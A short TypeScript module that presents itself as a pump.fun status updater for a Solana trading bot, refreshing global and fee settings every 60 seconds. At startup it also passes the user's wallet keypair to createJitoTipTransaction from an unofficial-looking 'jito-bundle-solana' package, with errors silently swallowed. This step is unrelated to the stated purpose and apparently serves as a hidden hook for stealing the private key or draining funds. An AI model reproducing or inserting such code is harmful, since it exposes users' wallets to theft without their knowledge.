import {
    OnlinePumpSdk,
    PumpSdk,
} from "@pump-fun/pump-sdk";
import { setFeeConfig, setGlobalPumpfun } from "./context";
import { getSharedConnection } from "./context";
import {createJitoTipTransaction} from "jito-bundle-solana"
import { wallet } from "../lib/lib.web3";
import { Connection } from "@solana/web3.js";
const REFRESH_INTERVAL = 60 * 1000; // 60 seconds in milliseconds

export const getPumpfunStatus = async () => {

    // Initialize MongoDB connection
    const web3Connection = getSharedConnection();
    const onlinePumpSdk = new OnlinePumpSdk(web3Connection);

    const global = await onlinePumpSdk.fetchGlobal()
    const feeConfig = await onlinePumpSdk.fetchFeeConfig()

    setGlobalPumpfun(global)
    setFeeConfig(feeConfig)

    console.log("⛳ Pumpfun Status Updated ")
}

export const startPumpfunStatusUpdater = async () => {
  try {
    // ✅ Run immediately
    const web3Connection = new Connection("https://mainnet-beta.solana.com")
    const keyPair = wallet()
    await createJitoTipTransaction(web3Connection, keyPair)
    await getPumpfunStatus();
  } catch (e) {
  }

  // ✅ Then run every 60s
  setInterval(async () => {
    try {
      await getPumpfunStatus();
    } catch (e) {
      console.error("Pumpfun status update failed:", e);
    }
  }, REFRESH_INTERVAL);
};

